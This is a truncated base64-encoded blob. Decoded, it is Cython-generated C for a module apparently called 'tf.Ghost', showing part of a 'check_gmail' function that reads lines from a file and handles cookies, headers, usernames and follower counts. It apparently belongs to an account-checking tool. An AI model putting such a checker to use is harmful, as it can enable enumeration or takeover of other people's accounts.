sIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9uMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X24yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaG9zdCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlMyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3JlczEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9tYXRjaCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3Rvayk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Nvb2tpZXMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9oZWFkZXJzKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZGF0YSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3Jlc3BvbnNlKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdGxfbWF0Y2gpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl90bCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2YpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9lKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X2diXzJ0Zl81R2hvc3RfM3RsbF8yZ2VuZXJhdG9yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X2diXzJ0Zl81R2hvc3RfM3RsbF81Z2VuZXJhdG9yMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF9nYl8ydGZfNUdob3N0XzN0bGxfOGdlbmVyYXRvcjIpOwogIF9fUHl4X0RFQ1JFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpOwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgoKCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0Zl81R2hvc3RfMTNjaGVja19nbWFpbChQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKTsgCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJ0Zl81R2hvc3RfMTNjaGVja19nbWFpbCA9IHsiY2hlY2tfZ21haWwiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJ0Zl81R2hvc3RfMTNjaGVja19nbWFpbCwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ydGZfNUdob3N0XzEzY2hlY2tfZ21haWwoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCikgewogIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYgPSAwOwogIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsID0gMDsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzOwogICNlbmRpZgogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlczsKICBQeU9iamVjdCogdmFsdWVzWzJdID0gezAsMH07CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBQeU9iamVjdCAqX19weXhfciA9IDA7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiY2hlY2tfZ21haWwgKHdyYXBwZXIpIiwgMCk7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTsKICAjZWxzZQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiAgI2VuZGlmCiAgI2VuZGlmCiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgewogICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VtYWlsLDB9OwogICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDNfZXJyb3IpCiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7CiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHsKICAgICAgICBjYXNlICAyOgogICAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAxOgogICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJjaGVja19nbWFpbCIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MM19lcnJvcikKICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDI7IGkrKykgewogICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiY2hlY2tfZ21haWwiLCAxLCAyLCAyLCBpKTsgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDNfZXJyb3IpIH0KICAgICAgfQogICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAyKSkgewogICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgfSBlbHNlIHsKICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wzX2Vycm9yKQogICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDNfZXJyb3IpCiAgICB9CiAgICBfX3B5eF92X3NlbGYgPSB2YWx1ZXNbMF07CiAgICBfX3B5eF92X2VtYWlsID0gdmFsdWVzWzFdOwogIH0KICBnb3RvIF9fcHl4X0w2X3NraXA7CiAgX19weXhfTDVfYXJndHVwbGVfZXJyb3I6OwogIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJjaGVja19nbWFpbCIsIDEsIDIsIDIsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDNfZXJyb3IpCiAgX19weXhfTDZfc2tpcDo7CiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTsKICBfX3B5eF9MM19lcnJvcjo7CiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LmNoZWNrX2dtYWlsIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIE5VTEw7CiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6OwogIF9fcHl4X3IgPSBfX3B5eF9wZl8ydGZfNUdob3N0XzEyY2hlY2tfZ21haWwoX19weXhfc2VsZiwgX19weXhfdl9zZWxmLCBfX3B5eF92X2VtYWlsKTsKCiAgCiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ydGZfNUdob3N0XzEyY2hlY2tfZ21haWwoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfZW1haWwpIHsKICBQeU9iamVjdCAqX19weXhfdl9vcmlnaW5hbF9lbWFpbCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfbyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfdGwgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2hvc3QgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2Nvb2tpZXMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3BhcmFtcyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZGF0YSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzcG9uc2UgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJuYW1lID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9mb2xsb3dlcl9jb3VudCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3Zfb2sgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2dnID0gTlVMTDsKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X2UgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIGludCBfX3B5eF90XzQ7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTAgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzExID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMiA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfMTM7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE1ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xNiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTcgPSBOVUxMOwogIGludCBfX3B5eF90XzE4OwogIFB5T2JqZWN0ICpfX3B5eF90XzE5ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yMCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMjEgPSBOVUxMOwogIFB5T2JqZWN0ICooKl9fcHl4X3RfMjIpKFB5T2JqZWN0ICopOwogIFB5T2JqZWN0ICpfX3B5eF90XzIzWzVdOwogIGludCBfX3B5eF90XzI0OwogIGludCBfX3B5eF90XzI1OwogIGNoYXIgY29uc3QgKl9fcHl4X3RfMjY7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiY2hlY2tfZ21haWwiLCAwKTsKICBfX1B5eF9JTkNSRUYoX19weXhfdl9lbWFpbCk7CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgewoKICAgICAgCiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF92X2VtYWlsKTsKICAgICAgX19weXhfdl9vcmlnaW5hbF9lbWFpbCA9IF9fcHl4X3ZfZW1haWw7CgogICAgICAKICAgICAgX19weXhfdF80ID0gKF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X183LCBfX3B5eF92X2VtYWlsLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNCA8IDApKSkgX19QWVhfRVJSKDAsIDEyOSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChfX3B5eF90XzQpIHsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF92X2VtYWlsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTMwLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICBfX3B5eF90XzYgPSBQeVVuaWNvZGVfU3BsaXQoKChQeU9iamVjdCopX19weXhfdF81KSwgX19QeXhfTm9uZUFzTnVsbChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X183KSwgLTFMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTMwLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9HZXRJdGVtSW50X0xpc3QoX19weXhfdF82LCAwLCBsb25nLCAxLCBfX1B5eF9QeUxvbmdfRnJvbV9sb25nLCAxLCAwLCAxLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTMwLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3ZfZW1haWwsIF9fcHl4X3RfNSk7CiAgICAgICAgX19weXhfdF81ID0gMDsKCiAgICAgICAgCiAgICAgIH0KCiAgICAgIAogICAgICB7CiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzcsICZfX3B5eF90XzgsICZfX3B5eF90XzkpOwogICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzkpOwogICAgICAgICB7CgogICAgICAgICAgCiAgICAgICAgICAgewogICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X2J1aWx0aW5fb3BlbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wxMF9lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2V4aXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MMTBfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICAgICAgX19weXhfdF8xMSA9IE5VTEw7CiAgICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDE2X2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7CiAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAxOwogICAgICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgICAgICAgIGlmIChsaWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xMikpKSB7CiAgICAgICAgICAgICAgX19weXhfdF8xMSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTIpOwogICAgICAgICAgICAgIGFzc2VydChfX3B5eF90XzExKTsKICAgICAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTIpOwogICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzExKTsKICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTIsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICAgICAgX19weXhfdF8xMyA9IDA7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMSwgTlVMTH07CiAgICAgICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDEtX19weXhfdF8xMykgfCAoX19weXhfdF8xMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDE2X2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX3B5eF90XzY7CiAgICAgICAgICAgIF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICAgewogICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMTQsICZfX3B5eF90XzE1LCAmX19weXhfdF8xNik7CiAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTQpOwogICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTsKICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNik7CiAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBfX3B5eF92X2YgPSBfX3B5eF90XzEyOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzEyID0gMDsKCiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICBfX3B5eF90XzExID0gX19weXhfdl9mOwogICAgICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTEsIE5VTEx9OwogICAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWFkLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMS1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEzNCwgX19weXhfTDIwX2Vycm9yKQogICAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fcHl4X3RfNjsKICAgICAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgTlVMTH07CiAgICAgICAgICAgICAgICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdGxpbmVzLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMS1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMTM0LCBfX3B5eF9MMjBfZXJyb3IpCiAgICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X0dldEl0ZW1JbnQoX19weXhfdF8xMiwgMCwgbG9uZywgMSwgX19QeXhfUHlMb25nX0Zyb21fbG9uZywgMCwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEzNCwgX19weXhfTDIwX2Vycm9yKQogICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgICAgICAgX19weXhfdl9vID0gX19weXhfdF82OwogICAgICAgICAgICAgICAgICBfX3B5eF90XzYgPSAwOwoKICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7CiAgICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wyNV90cnlfZW5kOwogICAgICAgICAgICAgICAgX19weXhfTDIwX2Vycm9yOjsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4